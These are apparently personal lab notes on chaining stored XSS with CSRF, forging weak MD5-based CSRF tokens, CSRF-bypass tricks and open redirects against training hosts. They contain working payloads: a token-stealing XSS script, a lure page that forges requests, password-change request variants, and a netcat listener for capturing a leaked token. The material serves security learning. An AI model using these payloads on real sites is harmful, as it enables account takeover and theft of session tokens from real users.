# 🇿🇲 Session Attacks 2

## XSS & CSRF Chaining

Her are some stuff we must know about this web app:

{% hint style="info" %}


* The application features same origin/same site protections as anti-CSRF measures (through a server configuration - you won't be able to actually spot it)
* The application's _Country_ field is vulnerable to stored XSS attacks
{% endhint %}

After creating our account, we run burp and see the "Change visibility" functionality ->

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

And in burp we see this:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We have to craft a payload and specify in the _Country_ field of Ela Stienen's profile to successfully execute a CSRF attack that will change the victim's visibility settings

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
//This action will be related to the handleResponse function
req.open('get','/app/change-visibility',true);
//three arguments. get which is the request method, the targeted path /app/change-visibility and then true which will continue the execution.
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
//defines a variable called token, which gets the value of responseText from the page we specified earlier in our request. /name="csrf" type="hidden" value="(\w+)"/)[1]; looks for a hidden input field called csrf and \w+ matches one or more alphanumeric characters.
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
// Here we change the method from GET to POST. The first request was to move us to the targeted page and the second request was to perform the wanted action.
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

Here is how you can identify the name of a hidden value or check if it is actually "CSRF".

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

If we get no result we can look through the HTML for some code that's looks like a token

Now to test out the payload, we submit it and click save

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we get a new account simulating the victim, we log in and go in a new tab to look for [http://minilab.htb.net/profile?email=ela.stienen@example.com](http://minilab.htb.net/profile?email=ela.stienen@example.com)

Before visiting the link, the target was private

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

and if we go back to our profile after visiting the payload webpage, we should see that his profile became "public"

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## Exploiting Weak CSRF Tokens

First we create our account, then on our profile we press _Change Visibility_ and then _Make Public_.

then in the network requests we spot this:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

We quickly see that the token is md5 ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n goldenpeacock467 | md5sum
0bef12f8998057a7656043b6d30c90a2  -
```

Now we craft our malicious page ->

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

In order to have our malicious page to have MD5-hashing functionality, save the below as `md5.min.js` and place it in the directory

```javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
//# sourceMappingURL=md5.min.js.map
```

Now we host our page and make our victim (which his account profile is not public) click on `http://<VPN/TUN Adapter IP>:1337/press_start_2_win.html`.

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

And if the target presses "Start!". We can  notice that the profile will become public!

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

## Additional CSRF Protection Bypasses

You can try making the CSRF token a null value (empty), for example:

`CSRF-Token:`

Setting the CSRF token value to the same length as the original CSRF token but with a different/random value:

Real:

`CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331`

Fake:

`CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3`

Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, `CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331`.

Log into the second account and change the value of _CSRF-Token_ to `9cfffd9e8e78bd68975e295d1b3d3331` while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks

we can try changing the request method. From _POST_ to _GET:_

```http
POST /change_password
POST body:
new_password=pwned&confirm_new=pwned
```

```http
GET /change_password?new_password=pwned&confirm_new=pwned
```

Not sending a token works fairly often because of the following common application logic mistake.

Normal:

```http
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

Let's try:

```http
POST /change_password
POST body:
new_password=qwerty
## or
new_password=qwerty&csrf_token=
```

## Open Redirect

An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality.

The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows:&#x20;

`trusted.site/index.php?url=https://evil.com`

`Here are some`&#x20;

URL parameters to look for when bug hunting, we'll often see them in login pages. Example: `/login.php?redirect=dashboard`

* ?url=
* ?link=
* ?redirect=
* ?redirecturl=
* ?redirect\_uri=
* ?return=
* ?return\_to=
* ?returnurl=
* ?go=
* ?goto=
* ?exit=
* ?exitpage=
* ?fromurl=
* ?fromuri=
* ?redirect\_to=
* ?next=
* ?newurl=
* ?redir=

For the exercise let's say this is our URL:

`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN>`

If you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the _redirect\_uri_ parameter. A _token_ is also included in the POST request. This token could be a session or anti-CSRF token and, therefore, useful to an attacker.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Let's test out if we can make requests through _redirect\_uri ->_

```shell-session
ElFelixi0@htb[/htb]$ nc -lvnp 1337
```

We can change the URL we got earlier with this ->

`http://oredirect.htb.net/?redirect_uri=http://<VPN/TUN Adapter IP>:PORT&token=<RANDOM TOKEN>`

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
